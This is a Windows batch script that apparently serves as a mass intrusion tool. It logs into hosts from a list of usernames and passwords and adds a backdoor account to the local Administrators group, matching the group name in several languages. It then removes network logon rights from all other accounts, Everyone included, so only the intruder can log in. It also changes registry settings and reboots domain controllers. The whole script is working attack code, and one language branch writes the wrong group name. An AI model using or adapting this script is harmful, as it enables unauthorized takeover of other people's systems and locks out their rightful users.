@echo off
setlocal
set reboot=0
set ALREADYDONE=0

if "%4"=="yes" goto :start
if not "%4"=="no" (
  echo %0 ^<input file^> ^<user^> ^<pass^> ^<yes^|no^> ^<"description"^>
  echo yes/no for srvinfo
  echo.
  goto :eof
)
:start
::if exist !READDFIX.TXT ren !READDFIX.TXT !READDFIX.TXT.OLD
set nuser=%2
set npass=%3
set opt=%4
set desc=%~5
::MAKE INPUT FILE
echo [User]>adduser.txt
echo %nuser%,,%npass%,%desc%,,,,>>adduser.txt
echo.>>adduser.txt
echo [Local]>>adduser.txt
::echo administrators,,%nuser%,>>adduser.txt
::--ASSIGN GLOBALS

	for /f "tokens=1,2,3 delims=:" %%i in (%1) do call :share %%i "%%j" %%k
	if exist results.txt call strip.bat
	psloglist -c -n 1 application >nul
	goto :eof
:share
	echo %1:%2:%3
	echos "Connecting."
	net use \\%1\ipc$ /u:"%~2" %3 >temp
	find "succ" temp>nul
	if %errorlevel% == 0 goto :skip
	echo %1:%2:%3>>badlogins.txt
	echo Failed To Share \\%1:%2:%3
	echo 	%1:%2:%3    Failed to Share>>!READDFIX.TXT
	goto :eof
:skip
	echos "."
	services_ list \\%1>servlist
	call cleanit.bat %1
	if "%opt%"=="yes" (
	  echo \\%1 With %2 : %3 >>RESULTS.TXT
	  echos "Srvinfo.."
	  srvinfo -ns \\%1 >>RESULTS.TXT
	)
	echos ".Delete."
	addusers /e adduser.txt \\%1 /p:e>nul
	echos ".Add."
	call :findadmin %1
	del tmp1 /f/q >nul
	addusers /c adduser1.txt \\%1 /p:e>nul
	set DC=0
	if exist \\%1\netlogon (
	  echos "DC."
	  set DC="1"
  	  echo %1:%nuser%:%npass%    Is A DC And Was Not LockedDown>>!READDFIX.TXT
  	  goto :e
	)
::--LOCKDOWN
	echos "Lockdown."
	grant show SeNetworkLogonRight %1>temp2
	for /f "skip=1 tokens=1* delims=" %%s in (temp2) do call :Parse %1 "%%s"
	del temp2/f/q>nul
	echos ".Granting."
	ntrights -u "%nuser%" -m \\%1 +r SeNetworkLogonRight >>temp
	echo %1:%nuser%:%npass%>>!READDFIX.TXT
:e
	regini -m \\%1 reg_anon.ini >nul
	echos "."
	if %DC%=="1" remboot \\%1 /f >nul

	net use \\%1 /d /y >nul
	echos "Done..Testing.."
	net use \\%1\ipc$ /u:%nuser% %npass% >temp
	find "succ" temp>nul
	if "%errorlevel%" == "1" echo FAILED!
	net use \\%1 /d /y >nul
	echo.
	echo.
	goto :eof

::-----------------------------------Code End------------------------------------
:Parse
	echos "."
	if "%~2"=="\Everyone" ( 
	  ntrights -u "Everyone" -m \\%1 -r SeNetworkLogonRight >temp
	  goto :eof
	)
	ntrights -u "%~2" -m \\%1 -r SeNetworkLogonRight >temp
	goto :eof

:findadmin
	copy /y adduser.txt adduser1.txt >nul
	lg \\%1>tmp1
	findstr /i "Administrators" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administrators,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "Administradores" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administradores,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "Administrateurs" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administrateurs,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "Administratoren" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administratoren,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "Administratorer" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administratorer,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "Administratörer" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administratörer,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "Amministratori" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Amministratori,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "Administratorzy" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administratorzy,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	findstr /i "ADMINISTRASJON" tmp1 >nul
	if "%errorlevel%"=="0" (
	  echo Administratorzy,,%nuser%,>>adduser1.txt
	  goto :eof
	)
	